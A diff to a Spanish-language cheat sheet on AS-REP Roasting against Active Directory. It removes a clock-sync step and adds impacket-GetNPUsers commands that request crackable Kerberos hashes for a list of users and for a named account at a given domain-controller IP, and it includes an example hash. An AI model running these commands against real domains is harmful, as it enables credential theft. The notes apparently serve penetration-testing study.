@@ -20,19 +20,6 @@ El "KRB_AS_REP Roasting" es un ataque dirigido a cuentas en dominios de Active D
 3. Ataque Offline: A diferencia de un ataque de fuerza bruta online, el atacante puede ahora intentar descifrar el TGT offline, utilizando herramientas de cracking de contraseñas para adivinar la contraseña sin alertar al sistema o bloquear la cuenta de usuario.
 ```
 
-## Sincronizar el reloj 
-
-```bash 
-Nota: Antes de iniciar al ataque debemos de sincronizar el reloj de la maquina de atacante con el AD
-
-❯ ntpdate IP     # Sincronizar el reloj 
-
-	# IP = Dirección IP del DC
-
-❯ date -s "2025-01-04 15:30:00"   # Restablecer la fecha y hora
-```
-
-## Explotar con Impacket
 
 ```bash 
 # Ejemplo de un hash 
@@ -40,7 +27,11 @@ Nota: Antes de iniciar al ataque debemos de sincronizar el reloj de la maquina d
 ❯ $krb5asrep$23$asrep.user@domain1.corp:0939461A3CF12B34FC2EEDE8C8154E15$55613643FA62AB315871CFD9B90978AB2D3...
 ```
 
+## Explotar con Impacket
+
 ```bash 
+❯ impacket-GetNPUsers -no-pass -usersfile users.txt domain.corp/        # Ataque usando un lista de usuarios 
+
 ❯ impacket-GetNPUsers 'domain1.corp/asrep.user' -no-pass -dc-ip 18.116.10.36 -request
 
 	# domain1.corp/asrep.user = Usuario vulnerable o lista de usuarios 
